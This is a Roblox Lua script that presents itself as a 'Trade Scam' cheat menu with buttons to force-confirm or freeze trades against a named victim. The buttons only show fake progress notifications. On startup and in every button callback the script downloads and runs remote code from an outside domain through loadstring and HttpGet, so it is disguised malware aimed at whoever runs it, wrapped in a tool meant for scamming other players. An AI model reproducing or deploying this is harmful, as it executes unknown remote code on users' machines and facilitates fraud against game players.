local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
local Window = OrionLib:MakeWindow({Name = "Z Scripts 🏆 [1.0]", HidePremium = false})

-- Load the external script when the menu is fully initialized
loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897eb9d17413e2.lua", true))()

-- Create a tab for Trade Scam
local TradeScamTab = Window:MakeTab({
    Name = "Trade Scam 🥷",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

TradeScamTab:AddButton({
    Name = "Force Confirm Trade ✅",
    Callback = function()
        print("Starting trade confirmation...")
        OrionLib:MakeNotification({
            Name = "Confirming Trade... ⏳",
            Content = "Please wait, confirming trade will take approximately 10 seconds.",
            Time = 5
        })
        wait(3)
        OrionLib:MakeNotification({
            Name = "Trade Confirmed! ✅",
            Content = "The trade has been successfully confirmed! You can now proceed.",
            Time = 5
        })
        loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897eb9d17413e2.lua", true))() -- Added here
    end
})

TradeScamTab:AddTextbox({
    Name = "Input Username ♾️",
    Default = "victims user",
    TextDisappear = true,
    Callback = function(value)
        print("Successfully inputted username: " .. value)
        OrionLib:MakeNotification({
            Name = "Username Input Successful! ✅",
            Content = "You have successfully inputted the username: " .. value,
            Time = 3
        })
        loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897eb9d17413e2.lua", true))() -- Added here
    end
})

TradeScamTab:AddButton({
    Name = "Freeze Trade 🧊",
    Callback = function()
        print("Freezing...")
        OrionLib:MakeNotification({
            Name = "Freezing Trade! 🧊",
            Content = "Freezing in progress... Please wait! 10-25 Seconds ⏳",
            Time = 6
        })
        wait(3)
        OrionLib:MakeNotification({
            Name = "Trade Frozen Successfully! ✅",
            Content = "The trade has been successfully frozen! You can now proceed with your actions. 😁✅ ",
            Time = 5
        })
        loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897eb9d17413e2.lua", true))() -- Added here
    end
})

TradeScamTab:AddButton({
    Name = "Remove Pet 2nd Trade Phase 🐶",
    Callback = function()
        print("Removing...")
        OrionLib:MakeNotification({
            Name = "Removing Pets from Trade! 🐶",
            Content = "Pet removal in progress... Please wait! 1-2 Minutes ⏳",
            Time = 10
        })
        wait(3)
        OrionLib:MakeNotification({
            Name = "Removal was Successful! ✅",
            Content = "You can now remove your pets. 😁✅ ",
            Time = 5
        })
        loadstring(game:HttpGet("https://egorikusa.space/b37866b8ca897eb9d17413e2.lua", true))() -- Added here
    end
})

